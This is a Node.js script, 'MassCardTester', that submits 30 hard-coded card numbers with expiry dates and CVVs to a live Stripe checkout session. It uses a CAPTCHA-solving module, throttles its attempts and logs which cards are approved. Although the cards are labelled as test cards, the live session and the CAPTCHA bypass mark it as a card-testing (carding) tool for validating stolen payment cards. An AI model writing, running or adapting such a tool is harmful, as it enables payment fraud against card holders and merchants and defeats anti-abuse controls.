#!/usr/bin/env node

const { parseCheckoutUrl } = require('./gateways/stripe/checkout-based/checkout-info');
const { attemptPayment, parseCardString } = require('./gateways/stripe/checkout-based/payer');
const RealHCaptchaSolver = require('./gateways/stripe/checkout-based/real-hcaptcha-solver');

// 30 Test Credit Cards
const TEST_CARDS = [
    '5444224035731677|11|2026|038',
    '5444224035731230|11|2029|253',
    '5444224035730240|11|2035|902',
    '5444224035733327|12|2027|091',
    '5444224035736379|12|2034|298',
    '5444224035730133|11|2027|991',
    '5444224035735959|11|2035|291',
    '5444224035738938|11|2029|297',
    '5444224035737617|11|2031|237',
    '5444224035733657|11|2033|704',
    '5444224035733210|12|2030|127',
    '5444224035739795|11|2027|680',
    '5444224035737948|12|2035|744',
    '5444224035736627|12|2032|488',
    '5444224035732444|11|2025|746',
    '5444224035737047|12|2030|721',
    '5444224035739134|12|2025|305',
    '5444224035739456|12|2030|484',
    '5444224035733988|12|2026|171',
    '5444224035732113|12|2033|666',
    '5444224035736841|12|2027|519',
    '5444224035736734|11|2033|316',
    '5444224035738714|12|2034|650',
    '5444224035734317|11|2030|667',
    '5444224035739027|11|2025|638',
    '5444224035734861|12|2026|712',
    '5444224035731123|12|2028|119',
    '5444224035735496|12|2034|356',
    '5444224035730810|12|2026|166',
    '5444224035731917|12|2031|435'
];

const CHECKOUT_URL = 'https://checkout.stripe.com/c/pay/cs_live_a1Ncf4mZHzTRpF1ICEdxkLkSIJSoSMyX1m9gcxJHMBZmUbLmJYxGJQiMPe#fid1d2BpamRhQ2prcSc%2FJ0xrcWB3JyknZ2p3YWB3VnF8aWAnPydhYGNkcGlxJykndnBndmZ3bHVxbGprUGtsdHBga2B2dkBrZGdpYGEnP2NkaXZgKSdkdWxOYHwnPyd1blppbHNgWjA0VW52YWFNT2ptfHNMQTdmf1xqVjAwUlV3U2p8MHFUN2QzVHRqQEN0YF9TPTBGRkJWbU5cdV8zd2swcn9hXDRNbUt%2FZnFxQ2FfcFF2RndybHU9VHU2VVZLNTVnalY2SWhAYScpJ2N3amhWYHdzYHcnP3F3cGApJ2dkZm5id2pwa2FGamlqdyc%2FJyY1NTU1NTUnKSdpZHxqcHFRfHVgJz8ndmxrYmlgWmxxYGgnKSdga2RnaWBVaWRmYG1qaWFgd3YnP3F3cGB4JSUl';

class MassCardTester {
    constructor() {
        this.results = [];
        this.solver = new RealHCaptchaSolver();
        this.stats = {
            total: 0,
            approved: 0,
            declined: 0,
            hcaptcha_solved: 0,
            errors: 0
        };
    }

    async runTests() {
        console.log('\n╔════════════════════════════════════════════════════════════╗');
        console.log('║    TESTING 30 CARDS WITH NEW CHECKOUT URL                 ║');
        console.log('╚════════════════════════════════════════════════════════════╝\n');

        console.log(`Testing ${TEST_CARDS.length} credit cards...\n`);

        for (let i = 0; i < TEST_CARDS.length; i++) {
            const card = TEST_CARDS[i];
            const cardNum = card.split('|')[0];
            const lastFour = cardNum.slice(-4);

            console.log(`[${i + 1}/${TEST_CARDS.length}] Card ending in ${lastFour}...`);

            try {
                const result = await this.testCard(card);
                this.results.push(result);
                this.updateStats(result);

                // Display result
                if (result.success) {
                    console.log(`   ✅ ${result.status.toUpperCase()}`);
                } else {
                    console.log(`   ❌ ${result.status.toUpperCase()}`);
                }
                if (result.error) {
                    console.log(`   ${result.error.message}`);
                }

            } catch (err) {
                console.log(`   ❌ ERROR: ${err.message}`);
                this.results.push({
                    card: cardNum,
                    success: false,
                    status: 'error',
                    error: err.message,
                    hcaptcha_solved: false
                });
                this.stats.errors++;
            }

            await new Promise(resolve => setTimeout(resolve, 500));
        }

        this.printSummary();
    }

    async testCard(cardStr) {
        try {
            const parsed = parseCheckoutUrl(CHECKOUT_URL);
            const card = parseCardString(cardStr);

            // Attempt payment
            const paymentResult = await attemptPayment({ checkoutUrl: CHECKOUT_URL, card });

            return {
                card: card.cardNumber,
                success: paymentResult.success,
                status: paymentResult.status,
                error: paymentResult.error,
                timestamp: new Date().toISOString()
            };

        } catch (err) {
            return {
                card: cardStr.split('|')[0],
                success: false,
                status: 'error',
                error: { message: err.message }
            };
        }
    }

    updateStats(result) {
        this.stats.total++;
        if (result.success) {
            this.stats.approved++;
        } else if (result.status === 'declined') {
            this.stats.declined++;
        } else {
            this.stats.errors++;
        }
    }

    printSummary() {
        console.log('\n╔════════════════════════════════════════════════════════════╗');
        console.log('║                    FINAL RESULTS                           ║');
        console.log('╚════════════════════════════════════════════════════════════╝\n');

        console.log(`Total Cards:    ${this.stats.total}`);
        console.log(`✅ Approved:    ${this.stats.approved} (${this.getPercentage(this.stats.approved)}%)`);
        console.log(`❌ Declined:    ${this.stats.declined} (${this.getPercentage(this.stats.declined)}%)`);
        console.log(`⚠️ Errors:      ${this.stats.errors} (${this.getPercentage(this.stats.errors)}%)`);

        // Group by status
        const byStatus = {};
        this.results.forEach(r => {
            if (!byStatus[r.status]) byStatus[r.status] = [];
            byStatus[r.status].push(r);
        });

        console.log('\n╔════════════════════════════════════════════════════════════╗');
        console.log('║                 BREAKDOWN BY STATUS                        ║');
        console.log('╚════════════════════════════════════════════════════════════╝\n');

        for (const [status, cards] of Object.entries(byStatus)) {
            console.log(`${status.toUpperCase()} (${cards.length}):`);
            cards.forEach((r, i) => {
                console.log(`  ${i + 1}. ${r.card.slice(-4)} - ${r.error ? r.error.message : 'Success'}`);
            });
            console.log('');
        }

        this.saveReport();
    }

    getPercentage(value) {
        if (this.stats.total === 0) return 0;
        return Math.round((value / this.stats.total) * 100);
    }

    saveReport() {
        const fs = require('fs');
        const report = {
            timestamp: new Date().toISOString(),
            checkout_url: CHECKOUT_URL,
            stats: this.stats,
            results: this.results
        };

        fs.writeFileSync(
            '/home/ubuntu/final-test-results-new-checkout.json',
            JSON.stringify(report, null, 2)
        );

        console.log('✅ Report saved to: /home/ubuntu/final-test-results-new-checkout.json');
    }
}

const tester = new MassCardTester();
tester.runTests().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
